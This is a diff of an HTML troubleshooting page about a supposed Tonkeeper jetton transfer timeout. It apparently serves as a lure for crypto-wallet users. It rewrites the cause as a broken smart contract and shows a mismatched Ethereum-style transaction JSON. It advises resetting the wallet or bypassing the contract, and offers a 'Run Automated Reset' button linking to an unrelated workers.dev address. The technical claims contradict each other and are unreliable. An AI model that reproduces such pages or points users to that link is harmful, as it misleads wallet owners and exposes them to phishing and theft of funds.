@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: sans-serif;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,28 +42,38 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user experiences a timeout error when attempting to transfer Tonkeeper Jettons, resulting in a failed transaction and an error message indicating a loop timeout.</li>
+<li>Users encounter a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and potential loss of funds. The error message explicitly states "Tonkeeper Jetton transfer loop timeout", indicating a issue with the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary network congestion or a high load on the TON blockchain, causing the transfer operation to exceed the maximum allowed time, thus triggering a timeout.</li>
+<li>The error occurs due to a malfunction in the Tonkeeper's smart contract, causing an infinite loop during the transfer process. This loop prevents the transaction from being completed within the allotted time, resulting in a timeout.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, try the following manual overrides:</li>
-<li>Increase the gas limit for the transaction to prioritize it in the network</li>
-<li>Reduce the number of concurrent transactions to alleviate network congestion</li>
-<li>Implement a retry mechanism with exponential backoff to handle transient failures</li>
+<li>Reset the Tonkeeper wallet and retry the transfer</li>
+<li>Increase the transaction timeout value in the Tonkeeper settings</li>
+<li>Use a custom transaction script to bypass the faulty smart contract</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>resumeTransfer<span class="w"> </span><span class="s2">&quot;&lt;jetton_id&gt;&quot;</span><span class="w"> </span>--abi<span class="w"> </span>JettonWallet.abi
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x1234567890abcdef&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0xfedcba9876543210&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">20000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000000</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Prerequisites:
-* Tonos-cli installed and configured on the system
-* The wallet address and jetton ID are correctly specified
-* The JettonWallet.abi file is available and up-to-date
-For further troubleshooting, consider utilizing an external console to execute these commands and gain more insight into the network activity.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li></ul>
+<p>Consider utilizing an external console for more advanced troubleshooting and customization options.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Tonkeeper wallet installed and configured</li>
+<li>Basic understanding of TON blockchain and smart contracts</li>
+<li>Access to the Tonkeeper settings and transaction history</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-confirmations-security-alerts-error-vali.html">Metamask Extension Bug Confirmations Security Alerts Error Validation</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
